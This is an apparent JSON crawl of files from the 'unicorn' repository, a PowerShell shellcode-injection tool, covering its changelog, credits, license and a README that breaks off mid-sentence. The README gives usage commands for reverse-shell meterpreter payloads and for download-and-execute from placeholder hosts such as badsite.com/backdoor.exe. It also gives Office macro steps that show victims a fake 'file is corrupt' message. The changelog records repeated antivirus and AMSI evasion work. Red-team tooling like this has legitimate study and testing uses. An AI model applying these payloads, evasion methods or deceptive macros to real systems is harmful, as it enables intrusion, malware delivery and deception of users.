{
  "metadata": {
    "timestamp": 1736559830743,
    "page": 571,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjU4MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "trustedsec/unicorn",
      "stars": 3767,
      "defaultBranch": "master",
      "files": [
        {
          "name": "CHANGELOG.txt",
          "type": "blob",
          "size": 19.234375,
          "content": "~~~~~~~~~~~~~~~~\nversion 3.17\n~~~~~~~~~~~~~~~~\n\n* change AMSI bytecode for better evasion for AMSI providers\n\n~~~~~~~~~~~~~~~~\nversion 3.16\n~~~~~~~~~~~~~~~~\n\n* change AMSI bytecode to evade AMSI provider detection\n\n~~~~~~~~~~~~~~~~\nversion 3.15\n~~~~~~~~~~~~~~~~\n\n* AMSI signature fix \n* added AMSI print decoded to payload output\n* AMSI bypass signature bypass\n\n~~~~~~~~~~~~~~~~\nversion 3.14\n~~~~~~~~~~~~~~~~\n\n* slimmed down payload to allow cmdline char restrictions\n* AMSI signature bypass\n\n~~~~~~~~~~~~~~~~\nversion 3.13\n~~~~~~~~~~~~~~~~\n\n* better evasion for Rasta's AMSI BYPASS\n* better evasion for Unicorn payload\n\n~~~~~~~~~~~~~~~~\nversion 3.12\n~~~~~~~~~~~~~~~~\n\n* fix an issue where if payload was generated, it would mess up the macro generation for AMSI_BYPASS if on\n* fix an issue in Metasploit generation payload would throw a lock file error. Updating Metasploit fixes this issue and added a prompt.\n\n~~~~~~~~~~~~~~~~\nversion 3.11\n~~~~~~~~~~~~~~~~\n\n* fix bug on amsi bypass \n* break av signature chain for payload\n* add better error handling \n* break av signature for amsi bypass\n* restructure amsi bypass code\n* add automatic evasion for opcodes\n\n~~~~~~~~~~~~~~~~\nversion 3.10\n~~~~~~~~~~~~~~~~\n\n* fix issue where meterpreter would not connect back as it was not specifying port properly\n* remove error message on length size when using AMSI_BYPASS=ON\n* add better evasion against amsi\n\n~~~~~~~~~~~~~~~~\nversion 3.9\n~~~~~~~~~~~~~~~~\n\n* incorporate better disable AMSI from Rasta - already encoded to get around detection https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1\n* add better evasion\n* added bypass_amsi on by default it will now generate two stages for powershell commands, you can turn this off in the unicorn.py option AMSI_BYPASS=\"ON\" to OFF\n\n~~~~~~~~~~~~~~~~\nversion 3.8.8\n~~~~~~~~~~~~~~~~ \n\n* remove double quotes which would cause compatibility issues on prior versions of Windows 10\n* change around virtualprotect for evasion\n\n~~~~~~~~~~~~~~~~\nversion 3.8.7\n~~~~~~~~~~~~~~~~\n\n* add () to bypass amsi\n\n~~~~~~~~~~~~~~~~\nversion 3.8.6\n~~~~~~~~~~~~~~~~\n\n* fix escaping issue\n* fix decode python3 error\n\n~~~~~~~~~~~~~~~~\nversion 3.8.5\n~~~~~~~~~~~~~~~~\n\n* add integer number for evasion\n\n~~~~~~~~~~~~~~~~\nversion 3.8.4\n~~~~~~~~~~~~~~~~\n\n* split up syswow64\n\n~~~~~~~~~~~~~~~~\nversion 3.8.3\n~~~~~~~~~~~~~~~~\n\n* reduce payload size by removing temporary replaces\n* add additional calloc/createthread changes to bypass signatures\n* remove print statement for shellcode\n\n~~~~~~~~~~~~~~~~\nversion 3.8.2\n~~~~~~~~~~~~~~~~\n\n* add dllimport function type to get around signatures\n\n~~~~~~~~~~~~~~~~\nversion 3.8.1\n~~~~~~~~~~~~~~~~\n\n* changed 32/64 bit detection method to [environment]::Is64BitOperatingSystem -eq 'True'\n* mangled true word to split it up\n* fixed an error that would cause raw_input to error out on python 2 (not 3) when using AMSI_BYPASS to ON\n\n~~~~~~~~~~~~~~~~\nversion 3.8\n~~~~~~~~~~~~~~~~\n\n* randomize noexit\n* fix a python3 decode issue when generating meterpreter shellcode\n* fix raw_input python 3 compatibility\n* fix lambda error with python3 and decode format\n* added a check for x64 bit shellcode and automatically downgrade payload for meterpreter\n\n~~~~~~~~~~~~~~~~\nversion 3.7.6\n~~~~~~~~~~~~~~~~\n\n* randomize downgrade code for evasion\n\n~~~~~~~~~~~~~~~~\n3.7.5\n~~~~~~~~~~~~~~~~\n\n* randomize IEX command\n\n~~~~~~~~~~~~~~~~\nversion 3.7.4\n~~~~~~~~~~~~~~~~\n\n* add randomization on byte replacing\n\n~~~~~~~~~~~~~~~~\nversion 3.7.3\n~~~~~~~~~~~~~~~~\n\n* remove stage encoding and configure meterpreter listener options for better evasion\n\n~~~~~~~~~~~~~~~~\nversion 3.7.2\n~~~~~~~~~~~~~~~~\n\n* fix macro injection escaping\n* when using smallest payload, it gets flagged - removing smallest option flag for meterpreter since we don't need it anymore due to code optimization\n\n~~~~~~~~~~~~~~~~\nversion 3.7.1\n~~~~~~~~~~~~~~~~\n\n* add Windows 7 support for Unicorn payload\n\n~~~~~~~~~~~~~~~~\nversion 3.7\n~~~~~~~~~~~~~~~~\n\n* remove variable name as random string insertion for av avoidance\n* add encoding and automatic stage loading in meterpreter (will flag AV) - looks to be time-gated, just load stdapi once meterpreter loaded\n* added better evasion around sv and gv\n\n~~~~~~~~~~~~~~~~\nversion 3.6.11\n~~~~~~~~~~~~~~~~\n\n* more evasion on add-type\n\n~~~~~~~~~~~~~~~~\nversion 3.6.10\n~~~~~~~~~~~~~~~~\n\n* shorten up payload and av evasion\n\n~~~~~~~~~~~~~~~~\nversion 3.6.9\n~~~~~~~~~~~~~~~~\n\n* move -pass to a different location\n\n~~~~~~~~~~~~~~~~\n3.6.8\n~~~~~~~~~~~~~~~~\n\n* mangle more CreateThread upon execution\n\n~~~~~~~~~~~~~~~~\nversion 3.6.7\n~~~~~~~~~~~~~~~~\n\n* mangle word for WIn32Functions\n\n~~~~~~~~~~~~~~~~\nversion 3.6.6\n~~~~~~~~~~~~~~~~\n\n* added mangle word for DllImport also shortened codebase\n\n~~~~~~~~~~~~~~~~\nversion 3.6.5\n~~~~~~~~~~~~~~~~\n\n* added mangle word for CreateThread\n\n~~~~~~~~~~~~~~~~\nversion 3.6.4\n~~~~~~~~~~~~~~~~\n\n* removed line continuation error when using macro injection\n\n~~~~~~~~~~~~~~~~\nversion 3.6.3\n~~~~~~~~~~~~~~~~\n\n* converted from VirtualAlloc to calloc and some additional changes\n\n~~~~~~~~~~~~~~~~\nversion 3.6.2\n~~~~~~~~~~~~~~~~\n\n* mangled VirtualAlloc for new signature updates\n\n~~~~~~~~~~~~~~~~\nversion 3.6.1\n~~~~~~~~~~~~~~~~\n\n* broke out function for parsing -f c in msfvenom so it can be used in other locations\n* shrunk payload size while enabling shikata_ga_nai for shellcode generation with unicorn by randomized special characters - shrinks payload drastically\n* added better handling for custom shellcode for metasploit\n* added ability to use custom shellcode to the custom shellcode generation for hta and macro - python unicorn.py <path_to_shellcode.txt> shellcode hta / macro / etc.\n\n~~~~~~~~~~~~~~~~\nversion 3.6\n~~~~~~~~~~~~~~~~\n\n* turn AMSI bypass to OFF by default, not needed unless you want to disable/patch in memory\n* removed liquify_bytes function for more preferred and smaller method which does replacement methods to circumvent AMSI signature providers\n\n~~~~~~~~~~~~~~~~\nversion 3.5.3\n~~~~~~~~~~~~~~~~\n\n* added wording and help menu for amsi bypass\n* added command line option for download/exec with macro\n\n~~~~~~~~~~~~~~~~\nversion 3.5.2\n~~~~~~~~~~~~~~~~\n\n* fix a bug that would cause download/exec not to work when using macro\n\n~~~~~~~~~~~~~~~~\nversion 3.5.1\n~~~~~~~~~~~~~~~~\n\n* more evasion *yawn*\n* added amsi bypass to get around completely, adds amsi flag to command line. If you are using this then the 2191 cmd prompt limit will be larger\n* added a PRINT_DECODED to unicorn.py, turn this to ON if you want to see the decoded command in its full extent\n\n~~~~~~~~~~~~~~~~\nversion 3.5\n~~~~~~~~~~~~~~~~\n\n* add randomized URILength - YOLO Justin Elze\n* removed sleep function for preferred -NoExit\n* add more evasion\n\n~~~~~~~~~~~~~~~~\nversion 3.4.5\n~~~~~~~~~~~~~~~~\n\n* move to while($true) instead of for loop\n* fix byte splitting for match on regular expression\n* slim down code (woot)\n* add better handling of liquify bytes\n\n~~~~~~~~~~~~~~~~\nversion 3.4.4\n~~~~~~~~~~~~~~~~\n\n* remove byte designation - not needed already in byte format\n\n~~~~~~~~~~~~~~~~\nversion 3.4.3\n~~~~~~~~~~~~~~~~\n\n* fix when liquify bytes called would not reroll variable names which could cause conflicts\n\n~~~~~~~~~~~~~~~~\nversion 3.4.2\n~~~~~~~~~~~~~~~~\n\n* remove -e''c as this breaks windows 7 compatibility, now works on win7\n\n~~~~~~~~~~~~~~~~\nversion 3.4.1\n~~~~~~~~~~~~~~~~\n\n* remove byte specification, not needed and shortens code base\n* fix cobalt strike hta and macro generation wording\n\n~~~~~~~~~~~~~~~~\nversion 3.4\n~~~~~~~~~~~~~~~~\n\n* fix opening payload with file error by using open instead (thanks jmhickman for PR)\n* fix macro injection technique that was not spawning a child process window which would cause powershell to fail\n* fix 32 bit compatibility\n* add better randomization variable name check conflicts (.lower())\n* fix hta attack vector\n* add a payload check for custom shellcode and cobalt strike to ensure its formatted properly\n\n~~~~~~~~~~~~~~~~\nversion 3.3.2\n~~~~~~~~~~~~~~~~\n\n* add double () for defender signature update\n\n~~~~~~~~~~~~~~~~\nversion 3.3.1\n~~~~~~~~~~~~~~~~\n\n* fix bugs where vars would be overwritten\n* readd exception handling\n\n~~~~~~~~~~~~~~~~\nversion 3.3\n~~~~~~~~~~~~~~~~\n\n* added back 32 bit compatibility\n* added better evasion through kernel32.dll\n* shaved shellcode size\n* move back to IntPtr, system.int32 no longer needed\n* add a variable check to ensure theres no variable name conflicts when using the powershell code\n\n~~~~~~~~~~~~~~~~\nversion 3.2.10\n~~~~~~~~~~~~~~~~\n\n* use System.Int32 instead of int\n\n~~~~~~~~~~~~~~~~\nversion 3.2.9\n~~~~~~~~~~~~~~~~\n\n* bugfix causing powershell to terminate\n\n~~~~~~~~~~~~~~~~\nversion 3.2.8\n~~~~~~~~~~~~~~~~\n\n* change intptr to int\n\n~~~~~~~~~~~~~~~~\nversion 3.2.7\n~~~~~~~~~~~~~~~~\n\n* randomize service name (lol)\n\n~~~~~~~~~~~~~~~~\nversion 3.2.6\n~~~~~~~~~~~~~~~~\n\n* added more byte splitting for better evasion\n* rewrote components for macro injection to circumvent av\n* rewrote components for HTA injection to circumvent av\n\n~~~~~~~~~~~~~~~~\nversion 3.2.5\n~~~~~~~~~~~~~~~~\n\n* add byte splitting based on defender sigs\n\n~~~~~~~~~~~~~~~~\nversion 3.2.4\n~~~~~~~~~~~~~~~~\n\n* added randomized integer lengths for dynamic byte ranges\n\n~~~~~~~~~~~~~~~~\nversion 3.2.3\n~~~~~~~~~~~~~~~~\n\n* create longer byte arrays for defender rule bypass\n\n~~~~~~~~~~~~~~~~\nversion 3.2.2\n~~~~~~~~~~~~~~~~\n\n* add python 3 compatibility\n* remove filewrite variable and move to function write_file for SettingContent-ms\n\n~~~~~~~~~~~~~~~~\nversion 3.2.1\n~~~~~~~~~~~~~~~~\n\n* update blog post and update readme\n* update unicorn metasploit meterpreter payload to remove a CLD from beginning of shellcode which was being snagged by defender\n\n~~~~~~~~~~~~~~~~\nversion 3.2\n~~~~~~~~~~~~~~~~\n\n* added new SettingContent-ms from enigma0x3 to Unicorn supports cobalt strike, metasploit, and custom shellcode\n* remove %windir%, getting flagged by AV\n\n~~~~~~~~~~~~~~~~\nversion 3.1\n~~~~~~~~~~~~~~~~\n\n* added secondary parse for older versions of cobalt strike\n* added better error handling around list index out of range\n* modified lower stack size due to powershell crashing sometimes, seems to be more stable now\n\n~~~~~~~~~~~~~~~~\nversion 3.0\n~~~~~~~~~~~~~~~~\n\n* added ability to import cobalt strike C# stager and use that as a unicorn based attack\n* added ability to import any shellcode directly into unicorn\n* remove cmd.exe depend on WSCRIPT.Shell - not needed and increases cmd line length limit\n* added ability to use custom shellcode with cobalt strike and shellcode methods for hta\n* added ability to use custom shellcode with cobalt strike and shellcode methods for macro\n* fixed line continuation error for long payloads when using excel (can't have long strings with & plus 25)\n* add hiding of powershell name in hta file\n\n~~~~~~~~~~~~~~~~\nversion 2.14\n~~~~~~~~~~~~~~~~\n\n* fix replace for /C that broke syntax for macros\n\n~~~~~~~~~~~~~~~~\nversion 2.13\n~~~~~~~~~~~~~~~~\n\n* added switches on command lines for evasion\n\n~~~~~~~~~~~~~~~~\nversion 2.12\n~~~~~~~~~~~~~~~~\n\n* added better handling for stack size detection on signatures - should no longer get flagged\n\n~~~~~~~~~~~~~~~~\nversion 2.11\n~~~~~~~~~~~~~~~~\n\n* reduce filesize by removing shikata from encoding on payload generation\n* add lenght limit size description on error on size\n\n~~~~~~~~~~~~~~~~\nversion 2.10\n~~~~~~~~~~~~~~~~\n\n* added IEX and formula evasion as DDE methods and split out attack vector into 3 different components\n* rewrote the download/exec payload so that it is custom shellcode that is manually patched with URL instead of metasploit one\n* numerous other enhancements and fixes\n\n~~~~~~~~~~~~~~~~\nversion 2.9.3\n~~~~~~~~~~~~~~~~\n\n* add better obfsucation on dde\n\n~~~~~~~~~~~~~~~~\nversion 2.9.2\n~~~~~~~~~~~~~~~~\n\n* fix compatibility with windows 7 - for some reason -e''c in Windows 7 breaks Unicorn whereas works fine within Windows 10\n\n~~~~~~~~~~~~~~~~\nversion 2.9.1\n~~~~~~~~~~~~~~~~\n\n* fix typo in powershell_command\n* added better obfsucation of path and code (thanks Will)\n\n~~~~~~~~~~~~~~~~\nversion 2.9\n~~~~~~~~~~~~~~~~\n\n* added a sys.exit() on length amount\n* added new dde code exec through unicorn from sensepost\n* fixed some wording in help menu\n* general code cleanup\n* slimmed down command line some more with seperator reduction and variable name size length\n\n~~~~~~~~~~~~~~~~\nversion 2.8.2\n~~~~~~~~~~~~~~~~\n\n* added better handling of randomized variable names\n* removed an extra semicolon\n* fixed typo\n* added count length for payload to ensure payload doesn't increase past max command line length of 8191\n* fixed minor casing on Start-Sleep\n\n~~~~~~~~~~~~~~~~\nversion 2.8.1\n~~~~~~~~~~~~~~~~\n\n* remove static variables - flagged by A/V\n\n~~~~~~~~~~~~~~~~\nversion 2.8\n~~~~~~~~~~~~~~~~\n\n* shortens length and obfuscation of unicorn command\n* removed direct -ec from powershell command\n\n~~~~~~~~~~~~~~~~\nversion 2.7.5\n~~~~~~~~~~~~~~~~\n\n* fix missing powershell call (thanks matterpreter)\n* improved additional wording on error message for macros\n\n~~~~~~~~~~~~~~~~\nversion 2.7.4\n~~~~~~~~~~~~~~~~\n\n* add a more real corrupt message from excel macro injection\n\n~~~~~~~~~~~~~~~~\nversion 2.7.3\n~~~~~~~~~~~~~~~~\n\n* fixed powershell injection obfuscation in macro injection - that was a pain :P\n* added bolt red to macro AutoOpen/Auto_Open difference based on version number\n* fixed powershell injection length issues by skimming down the chunking of powershell commands\n\n~~~~~~~~~~~~~~~~\nverison 2.7.2\n~~~~~~~~~~~~~~~~\n\n* random cleanup\n\n~~~~~~~~~~~~~~~~\nversion 2.7.1\n~~~~~~~~~~~~~~~~\n\n* fixed merge issue\n\n~~~~~~~~~~~~~~~~\nversion 2.7\n~~~~~~~~~~~~~~~~\n\n* added description to macro attack for AutoOpen/Auto_Open()\n* added obfuscation for actual base64 encoded strings\n* added better randomization on variable names\n\n~~~~~~~~~~~~~~~~\nversion 2.6\n~~~~~~~~~~~~~~~~\n\n* fixed an issue when generating hta if a folder was there it would not remove properly and overwrite\n* fixed a bug introduced by new obfuscation on proper escaping of quotes\n* added new obfuscation around HTA, variable names and split up shell commands to evade detection\n* improved code base for HTA attack vector and reliability\n\n~~~~~~~~~~~~~~~~\nversion 2.5.1\n~~~~~~~~~~~~~~~~\n\n* minor string format cleanup\n* pep8 formatting\n\n~~~~~~~~~~~~~~~~\nversion 2.5\n~~~~~~~~~~~~~~~~\n\n* complete rehaul on macro injection - adds heavy obfsucation through the entire codebase\n* changed generate_random_strings to remove any digits - this was due to macro strings not supporting numeric values.startswith()\n* code improvements and efficiency in vba code\n\n~~~~~~~~~~~~~~~~\nversion 2.4.3\n~~~~~~~~~~~~~~~~\n\n* fixed macro injection with new obfuscated method\n* added noprofile to command when using macro injection\n* changed AutoOpen to Auto_Open\n* fixed instructions to reflect\n\n~~~~~~~~~~~~~~~~\nversion 2.4.2\n~~~~~~~~~~~~~~~~\n\n* added shortened version of -window hidden to -w 1 which is shorthand for window hidden\n\n~~~~~~~~~~~~~~~~\nversion 2.4.1\n~~~~~~~~~~~~~~~~\n\n* added shortened method for obfsucation\n\n~~~~~~~~~~~~~~~~\nversion 2.4\n~~~~~~~~~~~~~~~~\n\n* added better handling if msf or shellcode didn't get formatted properly\n* added a new technique for obfsucation that should not get picked up anymore and removes the need for -e or -ec\n\n~~~~~~~~~~~~~~~~\nversion 2.3.5\n~~~~~~~~~~~~~~~~\n\n* added better evasion on encodedcommand\n\n~~~~~~~~~~~~~~~~\nversion 2.3.4\n~~~~~~~~~~~~~~~~\n\n* added decoded base64 -encodedcommand for better av evasion\n\n~~~~~~~~~~~~~~~~\nversion 2.3.3\n~~~~~~~~~~~~~~~~\n\n* most AVs were flagging on -enc instead of -EncodedCommand along with base64 would flag windows defender.. looks like this gets around it on both macro and standard ps1/encoded command params.\n\n~~~~~~~~~~~~~~~~\nversion 2.3.2\n~~~~~~~~~~~~~~~~\n\n* change auto_open to autopen() - thanks @JAshton\n\n~~~~~~~~~~~~~~~~\nversion 2.3.1\n~~~~~~~~~~~~~~~~\n\n* fix indent issue\n\n~~~~~~~~~~~~~~~~\nversion 2.3\n~~~~~~~~~~~~~~~~\n\n* added support for windows/download_exec as a payload option - just run python unicorn.py windows/download_exec exe=exename.exe url=http://badsite.com/backdoor.exe - note it doesn't need to be an exe, whatever you want to download and execute\n* fixes an issue that caused macro injection to not properly work (duplicate powershell command)\n\n~~~~~~~~~~~~~~~~\nversion 2.2\n~~~~~~~~~~~~~~~~\n\n* pep8 formatting\n* python3 conversion\n* added randomized variables (not fully completed yet but its better than before) - AV picking up on variables and base64 encoded strings\n\n~~~~~~~~~~~~~~~~\nversion 2.1.2\n~~~~~~~~~~~~~~~~\n\n* added enablestageencoding to true by default\n\n~~~~~~~~~~~~~~~~\nversion 2.1.1\n~~~~~~~~~~~~~~~~\n\n* added --smallest flag to msfvenom generate which compacts shellcode to smaller size\n\n~~~~~~~~~~~~~~~~\nversion 2.1\n~~~~~~~~~~~~~~~~\n\n* added ability to import your own powershell into attacks (thanks to curi0usJack pull request)\n* fixed an issue when generating macro attack with appropriate spacing on macros\n\n~~~~~~~~~~~~~~~~\nversion 2.0\n~~~~~~~~~~~~~~~~\n\n* added brand new hta attack vector for direct web application compromise (thanks Justin Elze)\n* added brand new attack binary to cert (thanks Matthew Graeber)\n* added window.close(); after script\n\n~~~~~~~~~~~~~~~~\nversion 1.3\n~~~~~~~~~~~~~~~~\n\n* slimmed down powershell injection code even more\n* when using windows/meterpreter/reverse_https, the option flags StagerURILength=5 StagerVerifySSLCert=false are specified in order to trim down payload. This is due to char restriction sizes when pasting into a command window. With these two settings, the codebase is slimmed down significantly and fits within the normal length \n* added support for shikata ga nai to obfuscate shellcode prior to utf and b64encoding. Will now through off sigs if contained inside of a file.\n\n~~~~~~~~~~~~~~~~\nversion 1.2\n~~~~~~~~~~~~~~~~\n\n* fixed an issue where powershell injection may not work on 32 bit platforms\n* shaved command line argument down around 32 bytes\n\n~~~~~~~~~~~~~~~~\nversion 1.1\n~~~~~~~~~~~~~~~~\n\n* fixed autoopen from not working on some office implementations - now works on all office documents including powerpoint/word/excel\n* changed the open description to fix a typo and also make it more believable \n* fixed spacing issues when generating macro attack\n* added instructions on when using macro on how to add the macro to an office document\n* added better description and instructions for powershell injection\n* added better description on initial loading of payload\n\n~~~~~~~~~~~~~~~~\nversion 1.0\n~~~~~~~~~~~~~~~~\n\n* incorporated new macro attack from Rik van Duijn RCX @rikduijn\n* code cleanup and fixed an issue that would not present argument values when not formatted properly\n* channeled stderr to subprocess.PIPE\n* slimmed unicorn powershell injection code about 17 bytes to compact powershell injection\n\n~~~~~~~~~~~~~~~~\nversion 0.5\n~~~~~~~~~~~~~~~~\n\n* fixed hidden window command when using powershell injection\n\n~~~~~~~~~~~~~~~~\nversion 0.4\n~~~~~~~~~~~~~~~~\n\n* shortened powershell injection code by removing un-used code and shortening initial command names\n* removed EnableStageEncoding - after testing extensively, this can produce unreliable results. \n* fixed a bug that caused unicorn to not work properly due to changes with MSFVenom\n* slimmed encoded powershell command, removed un-used else statement\n\n~~~~~~~~~~~~~~~~\nversion 0.3\n~~~~~~~~~~~~~~~~\n\n* updated msfvenom to include format type and architecture to remove bug it would not generate appropriate shellcode\n\n~~~~~~~~~~~~~~~~\nversion 0.2\n~~~~~~~~~~~~~~~~\n\n* changed output name\n* added appropriate licensing\n* slimmed the powershell code and added noprofile to downgrade process\n\n~~~~~~~~~~~~~~~~\nversion 0.1\n~~~~~~~~~~~~~~~~\n\n* initial release of magic unicorn\n"
        },
        {
          "name": "CREDITS.txt",
          "type": "blob",
          "size": 1.08984375,
          "content": "Special thanks to the following:\n\nMatthew Graeber for the powershell injection technique (http://www.exploit-monday.com/)\nMatthew Graeber for the Cert to Binary attack vector\nJosh Kelley and David Kennedy for Defcon 18 presentation (powershell encodedcommand bypass)\nJustin Elze for the HTA Attack vector\ncuri0usJack for github pull requests\nShawn Sullivan from TrustedSec for the Obfsucation Help\nSensepost blog: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\nDownload/Exec shellcode: https://www.exploit-db.com/exploits/24318/ \nDDE Evasion Techniques: http://staaldraad.github.io/2017/10/23/msword-field-codes/\nDaniel Bohannon for the switch commands\nMatt Nelson (enigma0x3) for this: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\nAMSI Bypass Technique:  https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html and https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/\nCarlos Perez (@carlos_perez) for the PowerShell ninja knowledge\nKevin Haubris for the help on the evasion techniques in Unicorn\n"
        },
        {
          "name": "LICENSE.txt",
          "type": "blob",
          "size": 2.0888671875,
          "content": "Copyright 2020, Magic Unicorn by TrustedSec, LLC\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer\n      in the documentation and/or other materials provided with the distribution.\n    * Neither the name of TrustedSec, LLC nor the names of its contributors may be used to endorse or promote products derived from\n      this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\nTHIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nThe above licensing was taken from the BSD licensing and is applied to Magic Unicorn as well.\n\nNote that the Magic Unicorn is provided as is, and is a royalty free open-source application.\n\nFeel free to modify, use, change, market, do whatever you want with it as long as you give the appropriate credit where credit\nis due (which means giving the authors the credit they deserve for writing it). Also note that by using this software, if you ever\nsee the creator of Magic Unicorn in a bar, you should give him a hug and buy him a beer. Hug must last at least 5 seconds. Author\nholds the right to refuse the hug or the beer.\n\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 16.490234375,
          "content": "unicorn\n=======\n\nWritten by: Dave Kennedy (@HackingDave)\nWebsite: https://www.trustedsec.com\n\nMagic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.\n\nUsage is simple, just run Magic Unicorn (ensure Metasploit is installed if using Metasploit methods and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system. Unicorn supports your own shellcode, cobalt strike, and Metasploit.\n```\nroot@rel1k:~/Desktop# python unicorn.py \n\n                                                         ,/\n                                                        //\n                                                      ,//\n                                          ___   /|   |//\n                                      `__/\\_ --(/|___/-/\n                                   \\|\\_-\\___ __-_`- /-/ \\.\n                                  |\\_-___,-\\_____--/_)' ) \\\n                                   \\ -_ /     __ \\( `( __`\\|\n                                   `\\__|      |\\)\\ ) /(/|\n           ,._____.,            ',--//-|      \\  |  '   /\n          /     __. \\,          / /,---|       \\       /\n         / /    _. \\  \\        `/`_/ _,'        |     |\n        |  | ( (  \\   |      ,/\\'__/'/          |     |\n        |  \\  \\`--, `_/_------______/           \\(   )/\n        | | \\  \\_. \\,                            \\___/\\\n        | |  \\_   \\  \\                                 \\\n        \\ \\    \\_ \\   \\   /                             \\\n         \\ \\  \\._  \\__ \\_|       |                       \\\n          \\ \\___  \\      \\       |                        \\\n           \\__ \\__ \\  \\_ |       \\                         |\n           |  \\_____ \\  ____      |                        |\n           | \\  \\__ ---' .__\\     |        |               |\n           \\  \\__ ---   /   )     |        \\              /\n            \\   \\____/ / ()(      \\          `---_       /|\n             \\__________/(,--__    \\_________.    |    ./ |\n               |     \\ \\  `---_\\--,           \\   \\_,./   |\n               |      \\  \\_ ` \\    /`---_______-\\   \\\\    /\n                \\      \\.___,`|   /              \\   \\\\   \\\n                 \\     |  \\_ \\|   \\              (   |:    |\n                  \\    \\      \\    |             /  / |    ;\n                   \\    \\      \\    \\          ( `_'   \\  |\n                    \\.   \\      \\.   \\          `__/   |  |\n                      \\   \\       \\.  \\                |  |\n                       \\   \\        \\  \\               (  )\n                        \\   |        \\  |              |  |\n                         |  \\         \\ \\              I  `\n                         ( __;        ( _;            ('-_';\n                         |___\\        \\___:            \\___:\n\n\naHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=\n\n                \n-------------------- Magic Unicorn Attack Vector -----------------------------\n\nNative x86 powershell injection attacks on any Windows platform.\nWritten by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)\nTwitter: @TrustedSec, @HackingDave\nCredits: Matthew Graeber, Justin Elze, Chris Gates\n\nHappy Magic Unicorns.\n\nUsage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>\nPS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443\nPS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe\nMacro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro\nMacro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro\nMacro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro\nHTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta\nHTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta\nHTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta\nDDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde\nCRT Example: python unicorn.py <path_to_payload/exe_encode> crt\nCustom PS1 Example: python unicorn.py <path to ps1 file>\nCustom PS1 Example: python unicorn.py <path to ps1 file> macro 500\nCobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)\nCustom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)\nHelp Menu: python unicorn.py --help\n```\n\n###                -----POWERSHELL ATTACK INSTRUCTIONS----\n\nEverything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.\n\nNote that you will need to have a listener enabled in order to capture the attack.\n\n###                -----MACRO ATTACK INSTRUCTIONS----\n\nFor the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do\nthat, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code\ninto that. This will automatically run. Note that a message will prompt to the user saying that the file\nis corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the\nvictim to thinking the excel document is corrupted. You should get a shell through powershell injection\nafter that.\n\nIf you are deploying this against Office365/2016+ versions of Word you need to modify the first line of \nthe output from: Sub Auto_Open()\n \nTo: Sub AutoOpen()\n \nThe name of the macro itself must also be \"AutoOpen\" instead of the legacy \"Auto_Open\" naming scheme.\n\nNOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO\nREMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS 